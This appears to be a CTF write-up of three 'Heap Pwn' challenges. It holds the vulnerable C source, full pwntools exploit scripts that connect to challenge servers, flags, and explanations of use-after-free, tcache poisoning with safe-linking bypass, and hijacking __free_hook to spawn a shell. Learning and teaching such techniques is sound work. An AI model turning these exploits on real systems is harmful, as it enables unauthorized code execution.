# Harsh Sankhala

# **Heap Pwn**

### Level 1

> Remote : nc 207.154.239.148 1369
> 

![Untitled](https://fzl-aws.notion.site/image/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F68ca7968-174f-4df4-ab04-3d91b871155c%2Fc7409795-8c60-4472-9627-bfd446a3a6b4%2FUntitled.png?table=block&id=4ed8f636-24e1-45f7-a739-c60bad815e19&spaceId=68ca7968-174f-4df4-ab04-3d91b871155c&width=1920&userId=&cache=v2)

`source code`

```c
#include <stdio.h>
#include <malloc.h>
#include <stdlib.h>

extern void * _IO_list_all;

char menu[] = "You are using %d/100 chunk addresses.\n1. New\n2. Delete\n3. Edit \n4. View data\n5. Exit\n> ";
int space = 0;
char* arr[100];
int arr_size[100];
char arr_in_use[100];

int menu_malloc(){
    int idx;
    unsigned long sz;
    printf("which index?\n> ");
    scanf("%d", &idx);
    getchar();
    printf("how big?\n> ");
    scanf("%ld", &sz);
    getchar();
    if ((idx >= 0) && (idx < 100)){
        arr[idx] = malloc(sz);
	arr_size[idx] = sz;
	arr_in_use[idx] = 1;
	space++;
    } else {
	printf("Invalid request\n");
	return 1;
    }
    //printf("first payload?\n> ");
    //fgets(arr[idx], sz, stdin);
    return 0;
}

int menu_free(){
    int idx;
    printf("which index?\n> ");
    scanf("%d", &idx);
    getchar();
    if ((idx >= 0) && (idx < 100)){
        free(arr[idx]);
	arr_in_use[idx]=0;
	space--;
    } else {
	printf("Invalid request\n");
	return 1;
    }
    return 0;
}

int menu_edit(){
    int idx;
    printf("which index?\n> ");
    scanf("%d", &idx);
    getchar();
    if ((idx >= 0) && (idx < 100)){
	printf("New contents?\n> ");
	fgets(arr[idx], arr_size[idx]-1, stdin);
    } else {
	printf("Invalid request\n");
	return 1;
    }
    return 0;
}

int menu_view(){
    int idx;
    printf("which index?\n> ");
    scanf("%d", &idx);
    getchar();
    if ((idx >= 0) && (idx < 100)){
        puts(arr[idx]);
    } else {
	printf("Invalid request\n");
	return 1;
    }
    return 0;
}

int main(){
    int choice;
    setvbuf(stdin, NULL, _IONBF, 1);
    setvbuf(stdout, NULL, _IONBF, 1);
    while (1) {
        printf(menu, space);
        scanf("%d", &choice);
        getchar();

        switch (choice)
        {
        case 1:
            menu_malloc();
            break;

        case 2:
            menu_free();
            break;

        case 3:
            menu_edit();
            break;

        case 4:
            menu_view();
            break;

        case 5:
            exit(0);
            break;

        default:
            break;
        }
    }
    return 0;
}
```

```bash
❯ nc 207.154.239.148 1369
You are using 0/100 chunk addresses.
1. New
2. Delete
3. Edit 
4. View data
5. Exit
> 
```

## Solution

`exploit.py`

```bash
#!/usr/bin/env python3

from pwn import *

context.terminal = ['tmux', 'splitw', '-h']
binaryname = "./spaghetti"
context.log_level = 'error'
context.binary = elf = ELF(binaryname)

if args.REMOTE:
    p=remote("207.154.239.148", 1369)
elif args.GDB:
    p=gdb.debug(binaryname, gdbscript=gs)
else:
    p=process(binaryname)

def malloc(ind, size):
    global p
    r1 = p.sendlineafter(b">", b"1")
    r2 = p.sendlineafter(b">", str(ind).encode())
    r3 = p.sendlineafter(b">", str(size).encode())
    #r4 = p.sendlineafter(b">",payload)
    return r1+r2+r3#+r4

def free(ind):
    global p
    r1 = p.sendlineafter(b">", b"2")
    r2 = p.sendlineafter(b">", str(ind).encode())
    return r1+r2

def edit(ind, payload):
    global p
    r1 = p.sendlineafter(b">", b"3")
    r2 = p.sendlineafter(b">", str(ind).encode())
    r3 = p.sendlineafter(b">",payload)
    return r1+r2+r3

def view(ind):
    global p
    r1 = p.sendlineafter(b">", b"4")
    r2 = p.sendlineafter(b">", str(ind).encode())
    r3 = p.recvuntil(b"You are using")
    return r1+r2+r3

def readLeak(resp):
    rawleak = resp.split(b'which index?\n> ')[1].split(b'\n')[0]
    paddedleak = rawleak.ljust(8, b'\x00')
    leak = u64(paddedleak)
    return leak

libc = elf.libc
context.log_level = 'info'

malloc(2, 0x4f8)
malloc(0, 0x18)
malloc(1, 0x18)

free(2)
libc.address = readLeak(view(2)) - 0x1ecbe0
info("libc base : " + hex(libc.address))

free(1)
free(0)

# Now the tcache is as such: chunk 0 -> chunk 1
# so we'll overwrite chunk 0's forward pointer to __free_hook

edit(0, pack(libc.sym.__free_hook))
malloc(3, 0x18)
malloc(4, 0x18) # this will return __free_hook address

edit(4, pack(libc.sym.system))
edit(3, b'/bin/sh\x00')

free(3)

context.log_level = 'error'
p.interactive(prompt='shell> ')
p.close()
```

> **Don't forget to run it along with the libc and binary in the same folder exploit.py is in**
> 

![carbon.png](https://fzl-aws.notion.site/image/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F68ca7968-174f-4df4-ab04-3d91b871155c%2F6a1d28b4-1c44-4b5c-b133-301e6aa25247%2Fcarbon.png?table=block&id=8dad3e6f-75d2-4e9c-8bab-86a32de9df60&spaceId=68ca7968-174f-4df4-ab04-3d91b871155c&width=1630&userId=&cache=v2)

**Flag :** `ninja{why_d03s_m1ch3lle_pf3iff3r_sh0w_up_1n_rap?}`

## Vulnerability Detection

1. **Vulnerability Type**: Use-After-Free (UAF)
    - **Explanation**: UAF vulnerabilities occur when a program continues to use memory after it has been freed, which can lead to unpredictable behavior or allow an attacker to execute arbitrary code.
2. **Vulnerable Functions**:
    - **`menu_free`**: This function frees the memory pointed to by **`arr[idx]`** but does not set the pointer to **`NULL`**. Thus, the pointer remains in the **`arr`** array and points to a now-freed memory location. This dangling pointer can be exploited.
    - **`menu_edit`**: This function allows writing data to **`arr[idx]`**, assuming it is still valid. If **`idx`** points to a previously freed chunk (due to a dangling pointer left by **`menu_free`**), **`menu_edit`** enables writing to this freed memory.
    

## Approach Explanation

Now the first thing you gotta try with this is overwriting heap metadata, 

- here we're in libc 2.31 so the __malloc_hook and __free_hook  are prime targets
so the idea would be overwriting some freed chunks' fd pointer in order to make malloc think that we can redistribute a chunk address at one of those hooks
this would allow us to then use the edit() function to overwrite whatever we want to be called instead of malloc or free
- so first we need a libc leak to find the address of those symbols and also to find the system() function in glibc
To do this it's actually pretty easy, you can allocate a big chunk (i did size 0x4f8) and free it (but make sure to add some chunks for padding between the big chunk and the wilderness otherwise it'll get consolidated by malloc and the leak won't work).
- This chunk will get linked inside of the unsorted bin and therefore will have an fd pointer to the main_arena which is a libc symbol so we'll be able to use the menu_read() to leak a libc pointer
- one we have this we can setup 2 small chunks ( i did size 0x18) : A and B and free B then free A After this we have tcache [ 0x18 ] = chunk A -> chunk B
now you can use edit() to edit chunk A's fd pointer and make it point to libc's __free_hook symbol instead because of this overwrite, if we now allocate a chunk C and a chunk D, chunk D will actually point to the __free_hook symbol
- then we can use edit() to overwrite __free_hook with the address of libc's system function
and free a chunk containing "/bin/sh\x00"
- this will call system("/bin/sh") instead of free
and pop a shell

## Exploit Explanation

1. **Heap Setup and Allocation**: The script first creates three heap chunks (**`malloc(2, 0x4f8)`**, **`malloc(0, 0x18)`**, **`malloc(1, 0x18)`**). The sizes are chosen carefully; the first one is large (0x4f8) to trigger specific behavior in the heap management, and the other two are small (0x18) which are commonly used for exploiting fastbins or tcache bins in the glibc memory allocator.
2. **Free and Leak**: The large chunk (index 2) is freed (**`free(2)`**), and then its contents are viewed (**`view(2)`**). Because the chunk was freed, the content viewed is the heap metadata, specifically the address of the next free chunk in the memory. This leak helps in determining the libc base address as this leaked address (**`readLeak()`**) is part of libc's memory management data structures. The offset (**`0x1ecbe0`**) is subtracted to find the libc base address.
3. **Free Small Chunks**: The script frees the two smaller chunks (**`free(1)`** and **`free(0)`**). This action places them in the tcache (thread cache), which is a mechanism to speed up allocations and frees by keeping a per-thread cache of recently freed chunks.
4. **Corrupt Forward Pointer**: Using the **`edit`** function, the script corrupts the forward pointer of the chunk at index 0 to point to the **`__free_hook`** (**`edit(0, pack(libc.sym.__free_hook))`**). The **`__free_hook`** is a function pointer used by libc to manage free operations, and overwriting it can control what function gets called on subsequent **`free()`** calls.
5. **Allocate Overwritten Chunks**: The script allocates two more chunks of the same size (**`malloc(3, 0x18)`** and **`malloc(4, 0x18)`**). Due to the previous corruption, the chunk returned at index 4 will actually be the **`__free_hook`**. This allows the attacker to overwrite the **`__free_hook`** with the address of the **`system`** function from libc (**`edit(4, pack(libc.sym.system))`**).
6. **Trigger Arbitrary Code Execution**: The chunk at index 3 is overwritten with the string **`'/bin/sh\x00'`** (**`edit(3, b'/bin/sh\x00')`**). Since the **`__free_hook`** now points to **`system`**, when **`free(3)`** is called, it effectively invokes **`system("/bin/sh")`**, spawning a shell.
7. **Gain Shell Access**: Finally, the script drops into an interactive mode (**`p.interactive()`**) where the attacker can interact with the spawned shell, effectively gaining control over the system under the context of the program's execution privileges.

This exploitation technique showcases classic heap exploitation strategies, such as leaking libc addresses to bypass ASLR, corrupting forward pointers in the tcache, and ultimately hijacking the **`__free_hook`** to gain arbitrary code execution.

# Level2

> **Remote : nc 207.154.239.148 1370**
> 

![Untitled](https://fzl-aws.notion.site/image/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F68ca7968-174f-4df4-ab04-3d91b871155c%2Fc1f895d3-27d2-4f43-9be4-287c3b75aafb%2FUntitled.png?table=block&id=69d719be-b091-4fbe-b345-dd7dc8ce8bca&spaceId=68ca7968-174f-4df4-ab04-3d91b871155c&width=1730&userId=&cache=v2)

**Source Code**

`level2.c`

```bash
#include <stdio.h>
#include <malloc.h>
#include <stdlib.h>

extern void * _IO_list_all;

char menu[] = "You are using %d/100 chunk addresses.\n1. New\n2. Delete\n3. Edit \n4. View data\n5. Exit\n> ";
int space = 0;
char* arr[100];
int arr_size[100];
char arr_in_use[100];

int menu_malloc(){
    int idx;
    unsigned long sz;
    printf("which index?\n> ");
    scanf("%d", &idx);
    getchar();
    printf("how big?\n> ");
    scanf("%ld", &sz);
    getchar();
    if ((idx >= 0) && (idx < 100)){
        arr[idx] = malloc(sz);
	arr_size[idx] = sz;
	arr_in_use[idx] = 1;
	space++;
    } else {
	printf("Invalid request\n");
	return 1;
    }
    //printf("first payload?\n> ");
    //fgets(arr[idx], sz, stdin);
    return 0;
}

int menu_free(){
    int idx;
    printf("which index?\n> ");
    scanf("%d", &idx);
    getchar();
    if ((idx >= 0) && (idx < 100)){
        free(arr[idx]);
	arr_in_use[idx]=0;
	space--;
    } else {
	printf("Invalid request\n");
	return 1;
    }
    return 0;
}

int menu_edit(){
    int idx;
    printf("which index?\n> ");
    scanf("%d", &idx);
    getchar();
    if ((idx >= 0) && (idx < 100)){
	printf("New contents?\n> ");
	fgets(arr[idx], arr_size[idx]-1, stdin);
    } else {
	printf("Invalid request\n");
	return 1;
    }
    return 0;
}

int menu_view(){
    int idx;
    printf("which index?\n> ");
    scanf("%d", &idx);
    getchar();
    if ((idx >= 0) && (idx < 100)){
        puts(arr[idx]);
    } else {
	printf("Invalid request\n");
	return 1;
    }
    return 0;
}

int main(){
    int choice;
    setvbuf(stdin, NULL, _IONBF, 1);
    setvbuf(stdout, NULL, _IONBF, 1);
    while (1) {
        printf(menu, space);
        scanf("%d", &choice);
        getchar();

        switch (choice)
        {
        case 1:
            menu_malloc();
            break;

        case 2:
            menu_free();
            break;

        case 3:
            menu_edit();
            break;

        case 4:
            menu_view();
            break;

        case 5:
            exit(0);
            break;

        default:
            break;
        }
    }
    return 0;
}
```

### **Exploit**

```bash
#!/usr/bin/env python3

from pwn import *

binaryname = "./encrypted"
context.binary = elf = ELF(binaryname)
libc = elf.libc

if args.REMOTE:
    p=remote("207.154.239.148", 1370)
elif args.GDB:
    p=gdb.debug(binaryname, gdbscript=gs)
else:
    p=process(binaryname)

def malloc(ind, size):
    global p
    r1 = p.sendlineafter(b">", b"1")
    r2 = p.sendlineafter(b">", str(ind).encode())
    r3 = p.sendlineafter(b">", str(size).encode())
    #r4 = p.sendlineafter(b">",payload)
    return r1+r2+r3#+r4

def free(ind):
    global p
    r1 = p.sendlineafter(b">", b"2")
    r2 = p.sendlineafter(b">", str(ind).encode())
    return r1+r2

def edit(ind, payload):
    global p
    r1 = p.sendlineafter(b">", b"3")
    r2 = p.sendlineafter(b">", str(ind).encode())
    r3 = p.sendlineafter(b">",payload)
    return r1+r2+r3

def view(ind):
    global p
    r1 = p.sendlineafter(b">", b"4")
    r2 = p.sendlineafter(b">", str(ind).encode())
    r3 = p.recvuntil(b"You are using")
    return r1+r2+r3

def readLeak(resp):
    rawleak = resp.split(b'which index?\n> ')[1].split(b'\n')[0]
    paddedleak = rawleak.ljust(8, b'\x00')
    leak = u64(paddedleak)
    return leak

def encrypt(target, heapbase):
    return target ^ (heapbase >> 12)

A = 0
B = 1
C = 2

malloc(C, 0x4f8)
malloc(A, 0x30)
malloc(B, 0x30)

free(A)
free(B)
free(C)

heapbase = readLeak(view(A)) << 4*3

malloc(3, 0x500)

libc.address = readLeak(view(C)) - 0x1e4030

print(hex(heapbase))
print(hex(libc.address))

edit(B, p64(encrypt(libc.sym.__free_hook, heapbase)))

malloc(B, 0x30)
malloc(4, 0x30)  # free hook

edit(B, b'/bin/sh\x00')
edit(4, p64(libc.sym.system))

free(B)

p.interactive()
p.close()
```

```bash
$ python3 exploit.py REMOTE
```

![Untitled](https://fzl-aws.notion.site/image/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F68ca7968-174f-4df4-ab04-3d91b871155c%2F9e24f86a-60d0-4828-8d93-8bd31e03aea7%2FUntitled.png?table=block&id=129397a3-a9bf-4819-a599-008635bc007f&spaceId=68ca7968-174f-4df4-ab04-3d91b871155c&width=2000&userId=&cache=v2)

# Level3

> **Remote : nc 207.154.239.148 1371**
> 

`exploit.py`

```bash
#!/usr/bin/env python3

from pwn import *

binaryname = "./free_a"
context.binary = elf = ELF(binaryname)
context.terminal = ['alacritty', '-e']
libc = elf.libc

gs = """
b *main
continue
"""
if args.REMOTE:
    p=remote("207.154.239.148", 1371)
elif args.GDB:
    p=gdb.debug(binaryname, gdbscript=gs)
else:
    p=process(binaryname)

def malloc(ind, size):
    global p
    r1 = p.sendlineafter(b">", b"1")
    r2 = p.sendlineafter(b">", str(ind).encode())
    r3 = p.sendlineafter(b">", str(size).encode())
    #r4 = p.sendlineafter(b">",payload)
    return r1+r2+r3#+r4

def free(ind):
    global p
    r1 = p.sendlineafter(b">", b"2")
    r2 = p.sendlineafter(b">", str(ind).encode())
    return r1+r2

def edit(ind, payload):
    global p
    r1 = p.sendlineafter(b">", b"3")
    r2 = p.sendlineafter(b">", str(ind).encode())
    r3 = p.sendlineafter(b">",payload)
    return r1+r2+r3

def view(ind):
    global p
    r1 = p.sendlineafter(b">", b"4")
    r2 = p.sendlineafter(b">", str(ind).encode())
    r3 = p.recvuntil(b"You are using")
    return r1+r2+r3

def readLeak(resp):
    rawleak = resp.split(b'which index?\n> ')[1].split(b'\n')[0]
    paddedleak = rawleak.ljust(8, b'\x00')
    leak = u64(paddedleak)
    return leak

def encrypt(target, heapbase):
    return target ^ (heapbase >> 12)

malloc(0, 0x4f8)
malloc(1, 0x68)

free(1)
malloc(1, 0x68)
heapbase = readLeak(view(1)) << 12

free(0)
malloc(90, 0x500)
malloc(0, 0x4f8)
libc.address = readLeak(view(0)) - 0x1e4030
free(90)

info("libc address: " + hex(libc.address))
info("heap base: " + hex(heapbase))
info("__free_hook@GLIBC: " + hex(libc.sym.__free_hook))

for i in range(7):
    malloc(i, 0x108)

malloc(7, 0x108)
malloc(8, 0x108)
malloc(9, 0x10) # padding to avoid top chunk consolidation

for i in range(7):
    free(i)

free(8)
free(7)

malloc(10, 0x108) # free one spot in tcache

free(8)
malloc(11, 0x218)

target = encrypt(libc.sym.__free_hook, heapbase + 0x1000)
edit(11, b'A'*0x108 + pack(0x111) + pack(target))

malloc(12, 0x108)
malloc(13, 0x108) # this controls __free_hook
edit(13, pack(libc.sym.system))
edit(12, b'/bin/sh\x00')

free(12) # system("/bin/sh")

p.interactive()
p.close()
```

![Untitled](https://fzl-aws.notion.site/image/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F68ca7968-174f-4df4-ab04-3d91b871155c%2Fe6823a4c-b4f6-400a-a0a3-dcf364f5ab72%2FUntitled.png?table=block&id=a56b1350-4bc4-4a4e-a487-cd041ed57970&spaceId=68ca7968-174f-4df4-ab04-3d91b871155c&width=1920&userId=&cache=v2)

```bash
ninja{st4ying_4t_th3_double_fr33_h0t3l}
```

# Happy Hacking : D

All in One

```bash
from pwn import *

def level1():
    binaryname = "./spaghetti"
    context.binary = elf = ELF(binaryname)

    p = remote("207.154.239.148", 1369)

    def malloc(ind, size):
        global p
        r1 = p.sendlineafter(b">", b"1")
        r2 = p.sendlineafter(b">", str(ind).encode())
        r3 = p.sendlineafter(b">", str(size).encode())
        return r1 + r2 + r3

    def free(ind):
        global p
        r1 = p.sendlineafter(b">", b"2")
        r2 = p.sendlineafter(b">", str(ind).encode())
        return r1 + r2

    def edit(ind, payload):
        global p
        r1 = p.sendlineafter(b">", b"3")
        r2 = p.sendlineafter(b">", str(ind).encode())
        r3 = p.sendlineafter(b">", payload)
        return r1 + r2 + r3

    def view(ind):
        global p
        r1 = p.sendlineafter(b">", b"4")
        r2 = p.sendlineafter(b">", str(ind).encode())
        r3 = p.recvuntil(b"You are using")
        return r1 + r2 + r3

    def readLeak(resp):
        rawleak = resp.split(b'which index?\n> ')[1].split(b'\n')[0]
        paddedleak = rawleak.ljust(8, b'\x00')
        leak = u64(paddedleak)
        return leak

    libc = elf.libc

    malloc(2, 0x4f8)
    malloc(0, 0x18)
    malloc(1, 0x18)

    free(2)
    libc.address = readLeak(view(2)) - 0x1ecbe0
    print(f"libc base : {hex(libc.address)}")

    free(1)
    free(0)

    edit(0, pack(libc.sym.__free_hook))
    malloc(3, 0x18)
    malloc(4, 0x18)

    edit(4, pack(libc.sym.system))
    edit(3, b'/bin/sh\x00')

    free(3)

    p.interactive(prompt='shell> ')
    p.close()

def level2():
    binaryname = "./encrypted"
    context.binary = elf = ELF(binaryname)
    libc = elf.libc

    p = remote("207.154.239.148", 1370)

    def malloc(ind, size):
        global p
        r1 = p.sendlineafter(b">", b"1")
        r2 = p.sendlineafter(b">", str(ind).encode())
        r3 = p.sendlineafter(b">", str(size).encode())
        return r1 + r2 + r3

    def free(ind):
        global p
        r1 = p.sendlineafter(b">", b"2")
        r2 = p.sendlineafter(b">", str(ind).encode())
        return r1 + r2

    def edit(ind, payload):
        global p
        r1 = p.sendlineafter(b">", b"3")
        r2 = p.sendlineafter(b">", str(ind).encode())
        r3 = p.sendlineafter(b">", payload)
        return r1 + r2 + r3

    def view(ind):
        global p
        r1 = p.sendlineafter(b">", b"4")
        r2 = p.sendlineafter(b">", str(ind).encode())
        r3 = p.recvuntil(b"You are using")
        return r1 + r2 + r3

    def readLeak(resp):
        rawleak = resp.split(b'which index?\n> ')[1].split(b'\n')[0]
        paddedleak = rawleak.ljust(8, b'\x00')
        leak = u64(paddedleak)
        return leak

    def encrypt(target, heapbase):
        return target ^ (heapbase >> 12)

    A = 0
    B = 1
    C = 2

    malloc(C, 0x4f8)
    malloc(A, 0x30)
    malloc(B, 0x30)

    free(A)
    free(B)
    free(C)

    heapbase = readLeak(view(A)) << 4 * 3

    malloc(3, 0x500)

    libc.address = readLeak(view(C)) - 0x1e4030

    print(hex(heapbase))
    print(hex(libc.address))

    edit(B, p64(encrypt(libc.sym.__free_hook, heapbase)))

    malloc(B, 0x30)
    malloc(4, 0x30)

    edit(B, b'/bin/sh\x00')
    edit(4, p64(libc.sym.system))

    free(B)

    p.interactive()
    p.close()

def level3():
    binaryname = "./free_a"
    context.binary = elf = ELF(binaryname)
    libc = elf.libc

    p = remote("207.154.239.148", 1371)

    def malloc(ind, size):
        global p
        r1 = p.sendlineafter(b">", b"1")
        r2 = p.sendlineafter(b">", str(ind).encode())
        r3 = p.sendlineafter(b">", str(size).encode())
        return r1 + r2 + r3

    def free(ind):
        global p
        r1 = p.sendlineafter(b">", b"2")
        r2 = p.sendlineafter(b">", str(ind).encode())
        return r1 + r2

    def edit(ind, payload):
        global p
        r1 = p.sendlineafter(b">", b"3")
        r2 = p.sendlineafter(b">", str(ind).encode())
        r3 = p.sendlineafter(b">", payload)
        return r1 + r2 + r3

    def view(ind):
        global p
        r1 = p.sendlineafter(b">", b"4")
        r2 = p.sendlineafter(b">", str(ind).encode())
        r3 = p.recvuntil(b"You are using")
        return r1 + r2 + r3

    def readLeak(resp):
        rawleak = resp.split(b'which index?\n> ')[1].split(b'\n')[0]
        paddedleak = rawleak.ljust(8, b'\x00')
        leak = u64(paddedleak)
        return leak

    def encrypt(target, heapbase):
        return target ^ (heapbase >> 12)

    malloc(0, 0x4f8)
    malloc(1, 0x68)

    free(1)
    malloc(1, 0x68)
    heapbase = readLeak(view(1)) << 12

    free(0)
    malloc(90, 0x500)
    malloc(0, 0x4f8)
    libc.address = readLeak(view(0)) - 0x1e4030
    free(90)

    print(f"libc address: {hex(libc.address)}")
    print(f"heap base: {hex(heapbase)}")
    print(f"__free_hook@GLIBC: {hex(libc.sym.__free_hook)}")

    for i in range(7):
        malloc(i, 0x108)

    malloc(7, 0x108)
    malloc(8, 0x108)
    malloc(9, 0x10)  # padding to avoid top chunk consolidation

    for i in range(7):
        free(i)

    free(8)
    free(7)

    malloc(10, 0x108)  # free one spot in tcache

    free(8)
    malloc(11, 0x218)

    target = encrypt(libc.sym.__free_hook, heapbase + 0x1000)
    edit(11, b'A'*0x108 + pack(0x111) + pack(target))

    malloc(12, 0x108)
    malloc(13, 0x108)  # this controls __free_hook
    edit(13, pack(libc.sym.system))
    edit(12, b'/bin/sh\x00')

    free(12)  # system("/bin/sh")

    p.interactive()
    p.close()

def menu():
    while True:
        print("Select the level to execute:")
        print("1. Level 1")
        print("2. Level 2")
        print("3. Level 3")
        print("4. Exit")
        
        choice = input("Enter your choice: ")
        
        if choice == '1':
            level1()
        elif choice == '2':
            level2()
        elif choice == '3':
            level3()
        elif choice == '4':
            print("Exiting the menu.")
            break
        else:
            print("Invalid choice. Please try again.")

if __name__ == "__main__":
    menu()
```